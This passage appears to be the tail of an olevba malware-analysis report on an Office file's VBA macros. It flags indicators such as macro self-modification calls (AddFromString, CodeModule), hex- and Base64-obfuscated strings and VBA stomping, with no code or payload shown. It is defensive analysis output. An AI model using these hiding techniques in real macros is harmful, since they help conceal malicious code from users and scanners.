|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

